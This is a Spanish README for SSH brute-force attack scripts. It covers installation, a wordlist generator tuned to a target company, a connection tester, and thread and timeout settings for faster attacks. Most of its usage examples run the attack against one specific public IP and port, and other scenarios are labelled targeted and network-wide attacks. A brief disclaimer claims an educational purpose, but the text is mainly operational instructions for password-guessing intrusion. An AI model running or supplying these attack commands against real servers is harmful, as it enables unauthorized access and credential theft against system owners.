# 🔧 Scripts de Fuerza Bruta SSH Mejorados

Este conjunto de scripts proporciona herramientas avanzadas para realizar ataques de fuerza bruta SSH con mejor manejo de errores, logging y opciones de configuración.

## 📁 Archivos Incluidos

- `ssh_brute.py` - Script original mejorado
- `ssh_brute_improved.py` - Versión completamente reescrita con logging
- `generate_wordlists.py` - Generador de listas de usuarios y contraseñas
- `test_ssh_connection.py` - Script de diagnóstico SSH
- `README_SSH_BRUTE.md` - Este archivo

## 🚀 Instalación y Dependencias

```bash
# Instalar dependencias
pip install paramiko faker

# O si usas un entorno virtual
python -m venv venv_ssh
source venv_ssh/bin/activate  # Linux/Mac
# venv_ssh\Scripts\activate  # Windows
pip install paramiko faker
```

## 📋 Uso de los Scripts

### 1. Script de Prueba SSH (`test_ssh_connection.py`)

**Recomendado ejecutar primero para diagnosticar problemas:**

```bash
# Prueba básica de conectividad
python test_ssh_connection.py 193.150.166.1 --port 5446

# Prueba completa con credenciales comunes
python test_ssh_connection.py 193.150.166.1 --port 5446 --full-test

# Probar credenciales específicas
python test_ssh_connection.py 193.150.166.1 --port 5446 --test-credentials admin password

# Probar diferentes versiones SSH
python test_ssh_connection.py 193.150.166.1 --port 5446 --test-versions
```

### 2. Generador de Listas (`generate_wordlists.py`)

**Crear listas personalizadas de usuarios y contraseñas:**

```bash
# Generar listas básicas
python generate_wordlists.py --users 100 --passwords 1000

# Generar listas específicas de empresa
python generate_wordlists.py --company "Mi Empresa" --output-prefix empresa

# Generar múltiples listas con diferentes tamaños
python generate_wordlists.py --generate-all --output-dir wordlists/

# Generar sin contraseñas comunes
python generate_wordlists.py --users 50 --passwords 500 --no-common
```

### 3. Script Mejorado (`ssh_brute_improved.py`)

**Script principal con logging y mejor manejo de errores:**

```bash
# Ataque básico
python ssh_brute_improved.py 193.150.166.1 --port 5446

# Ataque con configuración personalizada
python ssh_brute_improved.py 193.150.166.1 --port 5446 --threads 10 --timeout 3

# Usar listas personalizadas
python ssh_brute_improved.py 193.150.166.1 --port 5446 \
    --users wordlist_users.txt \
    --passwords wordlist_passwords.txt

# Modo verbose para debugging
python ssh_brute_improved.py 193.150.166.1 --port 5446 --verbose

# Generar más contraseñas
python ssh_brute_improved.py 193.150.166.1 --port 5446 --generate-passwords 2000
```

### 4. Script Original Mejorado (`ssh_brute.py`)

**Versión simplificada del script original:**

```bash
# Uso básico
python ssh_brute.py 193.150.166.1 --port 5446

# Con configuración personalizada
python ssh_brute.py 193.150.166.1 --port 5446 --threads 5
```

## 🔧 Opciones de Configuración

### Parámetros Comunes

- `--port` - Puerto SSH (default: 22)
- `--threads` - Número de hilos (default: 5)
- `--timeout` - Timeout de conexión en segundos (default: 5)
- `--verbose` - Modo verbose para debugging
- `--users` - Archivo con lista de usuarios
- `--passwords` - Archivo con lista de contraseñas

### Opciones Avanzadas

- `--generate-passwords` - Número de contraseñas a generar
- `--no-common` - No incluir contraseñas comunes
- `--test-versions` - Probar diferentes versiones SSH
- `--full-test` - Ejecutar todas las pruebas de diagnóstico

## 📊 Logging y Monitoreo

El script mejorado incluye:

- **Logging a archivo**: `ssh_brute.log`
- **Logging en consola**: Información en tiempo real
- **Estadísticas**: Intentos por segundo, tiempo total
- **Credenciales encontradas**: Guardadas en `ssh_credentials.txt`

## 🛠️ Solución de Problemas

### Error: "Error reading SSH protocol banner"

**Causa**: El servidor no responde correctamente al protocolo SSH.

**Soluciones**:
1. Verificar que el puerto esté abierto: `python test_ssh_connection.py IP --port PUERTO`
2. Reducir el número de hilos: `--threads 3`
3. Aumentar el timeout: `--timeout 10`
4. Verificar que no haya firewall bloqueando

### Error: "Bad file descriptor"

**Causa**: Problemas de manejo de conexiones simultáneas.

**Soluciones**:
1. Usar el script mejorado: `ssh_brute_improved.py`
2. Reducir el número de hilos
3. Aumentar el timeout de conexión

### Error: "Connection refused"

**Causa**: El puerto no está abierto o hay firewall.

**Soluciones**:
1. Verificar que el servicio SSH esté ejecutándose
2. Verificar configuración de firewall
3. Probar con `telnet IP PUERTO` o `nc -zv IP PUERTO`

## 📈 Optimización de Rendimiento

### Para Máxima Velocidad

```bash
# Configuración agresiva
python ssh_brute_improved.py IP --port PUERTO \
    --threads 20 \
    --timeout 2 \
    --generate-passwords 500
```

### Para Máxima Estabilidad

```bash
# Configuración conservadora
python ssh_brute_improved.py IP --port PUERTO \
    --threads 3 \
    --timeout 10 \
    --generate-passwords 100
```

## 🔒 Consideraciones de Seguridad

⚠️ **ADVERTENCIAS IMPORTANTES**:

1. **Solo usar en sistemas autorizados**
2. **Respetar políticas de seguridad**
3. **No usar para actividades ilegales**
4. **Considerar el impacto en el rendimiento del servidor**
5. **Usar con responsabilidad**

## 📝 Ejemplos de Uso Completo

### Escenario 1: Diagnóstico Inicial

```bash
# 1. Probar conectividad
python test_ssh_connection.py 192.168.1.100 --full-test

# 2. Si hay problemas, usar modo verbose
python test_ssh_connection.py 192.168.1.100 --test-versions --timeout 10
```

### Escenario 2: Ataque Dirigido

```bash
# 1. Generar listas específicas
python generate_wordlists.py --company "Empresa Objetivo" --output-prefix objetivo

# 2. Ejecutar ataque con listas personalizadas
python ssh_brute_improved.py 192.168.1.100 \
    --users objetivo_users_company.txt \
    --passwords objetivo_passwords_company.txt \
    --threads 10 \
    --verbose
```

### Escenario 3: Ataque de Red

```bash
# 1. Generar múltiples listas
python generate_wordlists.py --generate-all --output-dir wordlists/

# 2. Usar lista grande para ataque exhaustivo
python ssh_brute_improved.py 192.168.1.100 \
    --users wordlists/wordlist_users_grande.txt \
    --passwords wordlists/wordlist_passwords_grande.txt \
    --threads 15 \
    --timeout 3
```

## 📞 Soporte

Para problemas o mejoras:

1. Revisar los logs: `ssh_brute.log`
2. Usar modo verbose: `--verbose`
3. Ejecutar diagnóstico: `test_ssh_connection.py`
4. Verificar dependencias: `pip list | grep paramiko`

## 🔄 Actualizaciones

- **v2.0**: Script completamente reescrito con logging
- **v1.5**: Mejor manejo de errores y timeouts
- **v1.0**: Script original básico

---

**Nota**: Estos scripts son herramientas educativas. Úsalos responsablemente y solo en sistemas donde tengas autorización explícita.
